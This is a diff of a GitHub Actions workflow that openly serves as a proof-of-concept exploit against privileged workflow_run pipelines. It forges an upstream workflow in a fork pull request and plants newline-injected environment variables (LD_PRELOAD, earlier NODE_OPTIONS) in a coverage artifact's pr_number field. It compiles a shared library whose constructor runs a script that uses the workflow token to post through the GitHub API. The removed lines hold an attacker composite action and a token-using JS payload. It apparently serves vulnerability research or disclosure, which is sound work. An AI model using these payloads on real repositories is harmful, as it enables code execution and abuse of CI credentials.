@@ -1,8 +1,8 @@
 name: PR Code Coverage
 
-# Forged workflow added by the attacker inside their fork PR. It uses the same
-# name as the privileged `workflow_run` trigger's upstream workflow, so it fires
-# the privileged downstream workflow in the base repository.
+# Forged upstream workflow supplied by the attacker inside their pull request.
+# It uses the same workflow name as the real upstream workflow that the
+# privileged `workflow_run` workflow in the base repository watches for.
 on:
   pull_request:
 
@@ -13,9 +13,10 @@ jobs:
       - name: Fabricate coverage artifact
         run: |
           mkdir -p coverage-comment-data
+
           cat > coverage-comment-data/pr-info.json <<'JSON'
           {
-            "pr_number": "1\nNODE_OPTIONS=--require ./pwn.js\nEVIL=injected-by-fork",
+            "pr_number": "1\nEVIL=injected-by-fork\nLD_PRELOAD=/home/runner/work/gab-poc-mssql-wfrun/gab-poc-mssql-wfrun/pwn.so",
             "coverage_percentage": "99.99%",
             "covered_lines": "1",
             "total_lines": "1",
@@ -25,41 +26,33 @@ jobs:
             "ado_url": "https://example.invalid/build"
           }
           JSON
-          mkdir -p coverage-comment-data/.github/actions/post-coverage-comment
-          cat > coverage-comment-data/.github/actions/post-coverage-comment/action.yml <<'ACTEOF'
-          name: Post Coverage Comment
-          description: attacker-controlled composite action
-          runs:
-            using: composite
-            steps:
-              - name: pwn
-                shell: bash
-                run: |
-                  echo "PWNED-COMPOSITE-OVERRIDE-RCE"
-                  echo "EVIL=$EVIL"
-                  curl -s -o /dev/null -w "priv-api-comment-status:%{http_code}\n" -X POST \
-                    -H "Authorization: Bearer ${{ github.token }}" \
-                    -H "Accept: application/vnd.github+json" \
-                    "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/1/comments" \
-                    -d '{"body":"pwned: code execution from attacker-supplied artifact"}'
-          ACTEOF
-          cat > coverage-comment-data/pwn.js <<'JSEOF'
-          const fs = require('fs');
-          const token = process.env.INPUT_GITHUB_TOKEN || '';
-          try {
-            fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/pwned.txt',
-              'RCE-MARKER\nEVIL=' + process.env.EVIL + '\nTOKEN_PRESENT=' + (token ? 'yes' : 'no') + '\n');
-          } catch (e) { console.log('write-err ' + e.message); }
-          console.log('PWNED-RCE-MARKER EVIL=' + process.env.EVIL + ' token=' + (token ? 'present' : 'absent'));
-          (async () => {
-            try {
-              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/pulls/1', {
-                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json' }
-              });
-              console.log('PRIVILEGED-API-STATUS ' + r.status);
-            } catch (e) { console.log('api-err ' + e.message); }
-          })();
-          JSEOF
+
+          cat > coverage-comment-data/pwn.sh <<'SHEOF'
+          echo "PWNED-LD-PRELOAD-CODE-EXEC"
+          echo "token_input_present=${INPUT_GITHUB_TOKEN:+yes}"
+          code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
+            -H "Authorization: Bearer $INPUT_GITHUB_TOKEN" \
+            -H 'Accept: application/vnd.github+json' \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/1/comments" \
+            -d '{"body":"pwned: arbitrary code execution from attacker artifact with the workflow token"}')
+          echo "priv-api-comment-status:$code"
+          SHEOF
+
+          cat > pwn.c <<'CEOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <unistd.h>
+          __attribute__((constructor)) static void pwn(void) {
+              const char *ws = getenv("GITHUB_WORKSPACE");
+              char cmd[1024];
+              write(2, "PWNED-LD-PRELOAD-CONSTRUCTOR\n", 29);
+              if (ws) {
+                  snprintf(cmd, sizeof(cmd), "bash %s/pwn.sh 1>&2", ws);
+                  system(cmd);
+              }
+          }
+          CEOF
+          gcc -shared -fPIC -o coverage-comment-data/pwn.so pwn.c
           ls -la coverage-comment-data
           cat coverage-comment-data/pr-info.json | jq .
 
@@ -68,4 +61,3 @@ jobs:
         with:
           name: coverage-comment-data
           path: coverage-comment-data/
-          include-hidden-files: true
